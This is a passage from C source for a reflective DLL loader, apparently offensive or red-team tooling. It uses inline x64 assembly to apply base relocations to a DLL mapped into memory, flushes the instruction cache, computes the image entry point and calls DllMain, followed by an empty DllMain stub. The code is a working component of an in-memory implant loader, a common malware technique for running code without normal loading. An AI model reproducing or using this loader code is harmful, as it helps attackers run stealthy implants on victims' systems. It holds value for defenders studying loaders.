				"div bx \n" // RAX/RBX = relocSizeOfBlock/2 = RAX
				"mov %[RelocBlockEntries], rax \n"
				:[RelocBlockEntries] "=r" (RelocBlockEntries)
				:[relocSizeOfBlock] "r" (relocSizeOfBlock)
			);
			// nextRelocBlockEntryAddress is the first entry in the current relocation block
			// nextRelocBlockEntryAddress = nextRelocationBlock + sizeof(IMAGE_BASE_RELOCATION);
			// Add +0x8 to the address of our current RelocationBlock so we are at the first entry within the current RelocationBlock
			__asm__(
				"mov r12, %[nextRelocationBlock] \n"
				"add r12, 0x8 \n"
				"mov %[nextRelocBlockEntryAddress], r12 \n"
				:[nextRelocBlockEntryAddress] "=r" (nextRelocBlockEntryAddress)
				:[nextRelocationBlock] "r" (nextRelocationBlock)
			);

			// we itterate through all the entries in the current block...
			while( RelocBlockEntries-- )
			{
				//*(PVOID *)(relocVirtualAddress + ((PIMAGE_RELOC)nextRelocBlockEntryAddress)->offset) += BaseAddressDelta;
				__asm__(
					"mov rax, %[nextRelocBlockEntryAddress] \n"
					"mov r11, %[relocVirtualAddress] \n"
					"mov r12, %[BaseAddressDelta] \n"
					"xor rbx, rbx \n"
					"mov ax, [rax] \n"   // RAX = the 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
					"shl rax, 0x34 \n"   // only keep the last 12 bits of RAX by shaking the RAX register
					"shr rax, 0x34 \n"   // the last 12 bits is the offset, the first 4 bits is the type
					"add r11, rax \n"    // R11 = the in memory Virtual Address of our current relocation entry
					"mov rbx, [r11] \n"  // RBX = the value of the relocation entry
					"add rbx, r12 \n"    // RBX = The value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
					// Now we need to write our new calculated relocation value to the current relocation entry
					"mov [r11], rbx \n"  // WRITE THAT RELOC!
					: // no outputs
					:[nextRelocBlockEntryAddress] "r" (nextRelocBlockEntryAddress),
					[relocVirtualAddress] "r" (relocVirtualAddress),
					[BaseAddressDelta] "r" (BaseAddressDelta)
               			);
				// get the next entry in the current relocation block
				// nextRelocBlockEntry += sizeof( IMAGE_RELOC );
				__asm__(
                     			"mov r12, %[inNextRelocBlockEntryAddress] \n"
                     			"add r12, 0x2 \n"
                     			"mov %[outNextRelocBlockEntryAddress], r12 \n"
                     			:[outNextRelocBlockEntryAddress] "=r" (nextRelocBlockEntryAddress)
                     			:[inNextRelocBlockEntryAddress] "r" (nextRelocBlockEntryAddress)
                 		);
			}

			// get the next entry in the relocation directory
			// nextRelocationBlock = nextRelocationBlock + relocSizeOfBlock;
			__asm__(
                 		"mov rax, %[inNextRelocationBlock] \n"
                		"mov r11, %[relocSizeOfBlock] \n"
                		"add r11, rax \n"
              			"mov %[outNextRelocationBlock], r11 \n"
             			:[outNextRelocationBlock] "=r" (nextRelocationBlock)
             			:[inNextRelocationBlock] "r" (nextRelocationBlock),
                  		[relocSizeOfBlock] "r" (relocSizeOfBlock)
             		);
			// relocSizeOfBlock = SizeOf(nextRelocationBlock)
			__asm__(
				"mov rax, %[nextRelocationBlock] \n"
				"xor rbx, rbx \n"
				"mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
				"mov %[relocSizeOfBlock], rbx \n"
				:[relocSizeOfBlock] "=r" (relocSizeOfBlock)
				:[nextRelocationBlock] "r" (nextRelocationBlock)
			);
		}
	}

	// STEP 6: call our images entry point

	// the VA of our newly loaded DLL/EXE's entry point
	
	PVOID newRdllAddrEntryPoint;
	//newRdllAddrEntryPoint = ( newRdllAddr + ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.AddressOfEntryPoint );
	__asm__(
		"mov rax, %[OptionalHeaderAddr] \n"
		"mov rcx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x10 \n"
		"add rax, rbx \n"                              // OptionalHeader.AddressOfEntryPoint
		"mov eax, [rax] \n"
		"add rcx, rax \n"                              // newRdllAddr.EntryPoint
		"mov %[newRdllAddrEntryPoint], rcx \n"
		:[newRdllAddrEntryPoint] "=r" (newRdllAddrEntryPoint)
		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.

	// https://processhacker.sourceforge.io/doc/ntmmapi_8h.html#ae5b613493657596f36f5dd1262ef8fd0
	// NTSYSCALLAPI NTSTATUS NTAPI NtFlushInstructionCache	(	
	//	_In_ HANDLE 	ProcessHandle,
	// _In_opt_ PVOID 	BaseAddress,
	// _In_ SIZE_T 	Length )
	// HANDLE -1 is the handle to our current process
	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );

	// call our respective entry point, fudging our hInstance value
	((DLLMAIN)newRdllAddrEntryPoint)( (HINSTANCE)newRdllAddr, DLL_PROCESS_ATTACH, NULL );

	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
	return newRdllAddrEntryPoint;
}
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
